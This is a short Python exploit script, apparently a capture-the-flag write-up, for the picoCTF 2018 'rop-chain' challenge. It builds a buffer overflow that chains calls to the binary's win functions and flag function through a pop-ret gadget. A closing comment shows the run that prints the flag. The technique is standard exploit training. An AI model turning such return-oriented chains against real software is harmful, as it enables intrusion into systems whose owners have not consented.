import struct

def p(x):
    return struct.pack("I", x)

win_function1 = 0x80485cb
win_function2 = 0x80485d8
flag = 0x804862b
main = 0x804873b
pop_ret = 0x080485d6

payload = "A" * (16 + 8)
payload += "B" * 4 # Replace ebp

payload += p(win_function1)

payload += p(win_function2)
payload += p(pop_ret)
payload += p(0xbaaaaaad)

payload += p(flag)
payload += p(pop_ret)
payload += p(0xdeadbaad)

print(payload)

"""
Similar to buffer overflow 2, we need to make use of ROP gadgets to chain function calls together
with the correct inputs. It's pretty straightforward once you find the addresses of each function
and the address of the pop_ret gadget.

james9909@pico-2018-shell-3:/problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a$ python ~/rop.py | ./rop
Enter your input> picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
Segmentation fault
"""
